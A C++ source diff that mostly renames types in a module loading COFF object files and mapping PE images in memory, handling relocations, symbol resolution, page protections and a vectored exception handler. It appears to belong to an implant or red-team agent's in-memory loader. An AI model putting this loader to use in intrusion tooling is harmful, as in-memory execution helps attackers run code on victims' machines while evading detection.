@@ -103,18 +103,18 @@ namespace Objects {
         return false;
     }
 
-    BOOL ExecuteFunction(_executable *exe, const char *entry, void *args, const size_t size) {
+    BOOL ExecuteFunction(PEXECUTABLE exe, CONST CHAR *entry, VOID *args, CONST SIZE_T size) {
         HEXANE;
 
-        void *veh_handle = nullptr;
-        void *entrypoint = nullptr;
-        char *sym_name   = nullptr;
+        VOID *veh_handle = nullptr;
+        VOID *entrypoint = nullptr;
+        CHAR *sym_name   = nullptr;
 
-        bool success = true;
+        BOOL success = true;
         const auto file_head = exe->nt_head->FileHeader;
 
         // NOTE: register veh as execution safety net
-        if (!(veh_handle = ctx->nt.RtlAddVectoredExceptionHandler(1, &ExceptionHandler))) {
+        if (!(veh_handle = ctx->memapi.RtlAddVectoredExceptionHandler(1, &ExceptionHandler))) {
             success = false;
             goto defer;
         }
@@ -124,7 +124,7 @@ namespace Objects {
             const auto section  = SECTION_HEADER(exe->buffer, sec_index);
 
             if (section->SizeOfRawData > 0) {
-                uint32_t protect = 0;
+                DWORD protect = 0;
 
                 switch (section->Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)) {
                 case PAGE_NOACCESS:         protect = PAGE_NOACCESS; break;
@@ -144,7 +144,7 @@ namespace Objects {
                     protect |= PAGE_NOCACHE;
                 }
 
-                if (!NT_SUCCESS(ntstatus = ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), (void**) &exe->sec_map[sec_index].address, &exe->sec_map[sec_index].size, protect, nullptr))) {
+                if (!NT_SUCCESS(ntstatus = ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), (VOID**) &exe->sec_map[sec_index].address, &exe->sec_map[sec_index].size, protect, nullptr))) {
                     success = false;
                     goto defer;
                 }
@@ -152,7 +152,7 @@ namespace Objects {
         }
 
         if (exe->fn_map->size) {
-            if (!NT_SUCCESS(ntstatus = ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), (void**) &exe->fn_map->address, &exe->fn_map->size, PAGE_READONLY, nullptr))) {
+            if (!NT_SUCCESS(ntstatus = ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), (VOID**) &exe->fn_map->address, &exe->fn_map->size, PAGE_READONLY, nullptr))) {
                 success = false;
                 goto defer;
             }
@@ -166,7 +166,7 @@ namespace Objects {
                 sym_name = symbols[sym_index].First.Name; // inlined
             }
             else {
-                sym_name = (char*)(symbols + file_head.NumberOfSymbols) + symbols[sym_index].First.Value[1]; // not inlined
+                sym_name = (CHAR*) (symbols + file_head.NumberOfSymbols) + symbols[sym_index].First.Value[1]; // not inlined
             }
 
             // NOTE: compare symbols to entry names / entrypoint
@@ -193,19 +193,18 @@ namespace Objects {
 
     defer:
         if (veh_handle) {
-            ctx->nt.RtlRemoveVectoredExceptionHandler(veh_handle);
+            ctx->memapi.RtlRemoveVectoredExceptionHandler(veh_handle);
         }
 
         return success;
     }
 
-    BOOL BaseRelocation(_executable *exe) {
+    BOOL BaseRelocation(PEXECUTABLE exe) {
 
-        char sym_name[9]    = { };
-        char *name_ptr      = nullptr;
+        CHAR sym_name[9]    = { };
+        CHAR *name_ptr      = nullptr;
 
-        uint32_t fn_count   = 0;
-        bool success        = true;
+        BOOL success = true;
 
         const auto buffer   = exe->buffer;
         const auto symbols  = exe->symbols;
@@ -213,11 +212,12 @@ namespace Objects {
         for (auto sec_index = 0; sec_index < exe->nt_head->FileHeader.NumberOfSections; sec_index++) {
             void *function = nullptr;
 
-            const auto section  = SECTION_HEADER(buffer, sec_index);
-            auto reloc = RELOC_SECTION(buffer, section);
+            PIMAGE_SECTION_HEADER section = SECTION_HEADER(buffer, sec_index);
+            PRELOC reloc = RELOC_SECTION(buffer, section);
 
             for (auto rel_index = 0; rel_index < section->NumberOfRelocations; rel_index++) {
-                const auto head = &symbols[reloc->SymbolTableIndex];
+                PCOFF_SYMBOL head = &symbols[reloc->SymbolTableIndex];
+                DWORD fn_count = 0;
 
                 if (head->First.Value[0]) {
                     MemSet(sym_name, 0, 9);
@@ -225,12 +225,12 @@ namespace Objects {
                     name_ptr = sym_name;
                 }
                 else {
-                    name_ptr = (char*) (symbols + exe->nt_head->FileHeader.NumberOfSymbols) + head->First.Value[1];
+                    name_ptr = (CHAR*) (symbols + exe->nt_head->FileHeader.NumberOfSymbols) + head->First.Value[1];
                 }
 
-                void *reloc_addr    = exe->sec_map[sec_index].address + reloc->VirtualAddress;
-                void *sec_addr      = exe->sec_map[head->SectionNumber - 1].address;
-                void *fn_addr       = exe->fn_map + (fn_count * sizeof(void*));
+                VOID *reloc_addr    = exe->sec_map[sec_index].address + reloc->VirtualAddress;
+                VOID *sec_addr      = exe->sec_map[head->SectionNumber - 1].address;
+                VOID *fn_addr       = exe->fn_map + fn_count * sizeof(VOID*);
 
                 if (!ProcessSymbol(name_ptr, &function)) {
                     success = false;
@@ -240,8 +240,8 @@ namespace Objects {
                 if (function) {
                     switch (reloc->Type) {
                         case IMAGE_REL_AMD64_REL32: {
-                            *(void**) fn_addr       = function;
-                            *(uint32_t*) reloc_addr = U_PTR(fn_addr) - U_PTR(reloc_addr) - sizeof(uint32_t);
+                            *(VOID**) fn_addr       = function;
+                            *(UINT32*) reloc_addr = U_PTR(fn_addr) - U_PTR(reloc_addr) - sizeof(UINT32);
                         }
                         default:
                             break;
@@ -293,8 +293,8 @@ namespace Objects {
     BOOL MapSections(PEXECUTABLE module) {
         HEXANE;
 
-        auto region_size    = (size_t) module->nt_head->OptionalHeader.SizeOfImage;
-        auto pref_base      = module->nt_head->OptionalHeader.ImageBase;
+        auto region_size = (SIZE_T) module->nt_head->OptionalHeader.SizeOfImage;
+        const auto pref_base  = module->nt_head->OptionalHeader.ImageBase;
 
         module->base = pref_base;
 
@@ -309,18 +309,18 @@ namespace Objects {
             }
         }
 
-        for (DWORD i = 0; i < module->nt_head->OptionalHeader.SizeOfHeaders; i++) {
+        for (auto i = 0; i < module->nt_head->OptionalHeader.SizeOfHeaders; i++) {
             B_PTR(module->base)[i] = module->buffer[i];
         }
 
-        for (DWORD i = 0; i < module->nt_head->FileHeader.NumberOfSections; i++, module->section++) {
-            for (DWORD j = 0; j < module->section->SizeOfRawData; j++) {
+        for (auto i = 0; i < module->nt_head->FileHeader.NumberOfSections; i++, module->section++) {
+            for (auto j = 0; j < module->section->SizeOfRawData; j++) {
 
                 (B_PTR(module->base + module->section->VirtualAddress))[j] = (module->buffer + module->section->PointerToRawData)[j];
             }
         }
 
-        ULONG_PTR base_offset = module->base - pref_base;
+        UINT_PTR base_offset = module->base - pref_base;
         PIMAGE_DATA_DIRECTORY relocdir  = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 
         // if non-zero rva and relocdir exists...
@@ -332,10 +332,10 @@ namespace Objects {
 
                 do {
                     switch (head->Type) {
-                        case IMAGE_REL_BASED_DIR64:     *(uint32_t*) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += base_offset; break;
-                        case IMAGE_REL_BASED_HIGHLOW:   *(uint32_t*) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += (uint32_t) base_offset; break;
-                        case IMAGE_REL_BASED_HIGH:      *(uint32_t*) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += HIWORD(base_offset); break;
-                        case IMAGE_REL_BASED_LOW:       *(uint32_t*) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += LOWORD(base_offset); break;
+                        case IMAGE_REL_BASED_DIR64:     *(UINT32*) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += base_offset; break;
+                        case IMAGE_REL_BASED_HIGHLOW:   *(UINT32*) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += (UINT32) base_offset; break;
+                        case IMAGE_REL_BASED_HIGH:      *(UINT32*) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += HIWORD(base_offset); break;
+                        case IMAGE_REL_BASED_LOW:       *(UINT32*) (B_PTR(module->base) + reloc->VirtualAddress + head->Offset) += LOWORD(base_offset); break;
                     }
                     head++;
 
@@ -349,26 +349,26 @@ namespace Objects {
         return true;
     }
 
-    SIZE_T GetFunctionMapSize(_executable *exe) {
+    SIZE_T GetFunctionMapSize(PEXECUTABLE exe) {
 
-        char sym_name[9]    = { };
-        int counter         = 0;
+        CHAR sym_name[9]    = { };
+        INT counter         = 0;
 
         for (auto sec_index = 0; sec_index < exe->nt_head->FileHeader.NumberOfSections; sec_index++) {
             const auto section  = SECTION_HEADER(exe->buffer, sec_index);
             auto reloc          = RELOC_SECTION(exe->buffer, exe->section);
 
             for (auto rel_index = 0; rel_index < section->NumberOfRelocations; rel_index++) {
+                CHAR *buffer        = nullptr;
                 const auto symbols  = exe->symbols;
-                char *buffer        = nullptr;
 
-                if (_coff_symbol *symbol = &symbols[reloc->SymbolTableIndex]; symbol->First.Value[0]) {
+                if (PCOFF_SYMBOL symbol = &symbols[reloc->SymbolTableIndex]; symbol->First.Value[0]) {
                     MemSet(sym_name, 0, sizeof(sym_name));
                     MemCopy(sym_name, symbol->First.Name, 8);
                     buffer = sym_name;
                 }
                 else {
-                    buffer = RVA(char*, symbols, exe->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
+                    buffer = RVA(CHAR*, symbols, exe->nt_head->FileHeader.NumberOfSymbols) + symbol->First.Value[1];
                 }
 
                 if (HashStringA(buffer, COFF_PREP_SYMBOL_SIZE) == COFF_PREP_SYMBOL) {
@@ -440,7 +440,7 @@ namespace Objects {
     VOID RemoveCoff(uint32_t bof_id) {
         HEXANE;
 
-        _coff_params *prev = { };
+        PCOFF_PARAMS prev = { };
 
         if (!bof_id) {
             return;
@@ -478,14 +478,14 @@ namespace Objects {
         if (!exe || !exe->base) {
             return;
         }
-        if (!NT_SUCCESS(ntstatus = ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), &exe->base, &exe->size, PAGE_READWRITE, nullptr))) {
+        if (!NT_SUCCESS(ntstatus = ctx->memapi.NtProtectVirtualMemory(NtCurrentProcess(), (VOID**) &exe->base, &exe->size, PAGE_READWRITE, nullptr))) {
             // LOG ERROR
             return;
         }
 
-        MemSet(exe->base, 0, exe->size);
+        MemSet((VOID*) exe->base, 0, exe->size);
 
-        void *pointer   = exe->base;
+        VOID *pointer   = (VOID*) exe->base;
         size_t size     = exe->size;
 
         if (!NT_SUCCESS(ntstatus = ctx->memapi.NtFreeVirtualMemory(NtCurrentProcess(), &pointer, &size, MEM_RELEASE))) {
@@ -498,17 +498,17 @@ namespace Objects {
             exe->sec_map = nullptr;
         }
 
-        ZeroFree(exe, sizeof(_executable));
+        ZeroFree(exe, sizeof(EXECUTABLE));
     }
 
     VOID CoffLoader(char* entrypoint, void* data, void* args, size_t args_size) {
         HEXANE;
         // NOTE: sec_map seems to be the only thing that persists
 
-        bool success = true;
+        PEXECUTABLE exe = CreateImageData((UINT8*) data); ;
+        BOOL success = true;
 
-        _executable *exe    = CreateImageData((uint8_t*) data); ;
-        auto next           = (uint8_t*) exe->base;
+        auto next = (UINT8*) exe->base;
 
         x_assertb(exe->buffer    = (uint8_t*) data);
         x_assertb(exe->sec_map   = (_object_map*) Malloc(sizeof(void*) * sizeof(_object_map)));
@@ -517,7 +517,7 @@ namespace Objects {
         exe->fn_map->size = GetFunctionMapSize(exe);
 
         // NOTE: calculating address/size of sections before base relocation
-        for (uint16_t sec_index = 0; sec_index < exe->nt_head->FileHeader.NumberOfSections; sec_index++) {
+        for (auto sec_index = 0; sec_index < exe->nt_head->FileHeader.NumberOfSections; sec_index++) {
             const auto section = SECTION_HEADER(exe->buffer, sec_index);
 
             exe->size += section->SizeOfRawData;
@@ -526,9 +526,9 @@ namespace Objects {
 
         exe->size += exe->fn_map->size;
 
-        x_ntassertb(ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), &exe->base, exe->size, &exe->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+        x_ntassertb(ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (VOID**) &exe->base, exe->size, &exe->size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
 
-        for (uint16_t sec_index = 0; sec_index < exe->nt_head->FileHeader.NumberOfSections; sec_index++) {
+        for (auto sec_index = 0; sec_index < exe->nt_head->FileHeader.NumberOfSections; sec_index++) {
             const auto section = SECTION_HEADER(exe->buffer, sec_index);
 
             exe->sec_map[sec_index].size     = section->SizeOfRawData;
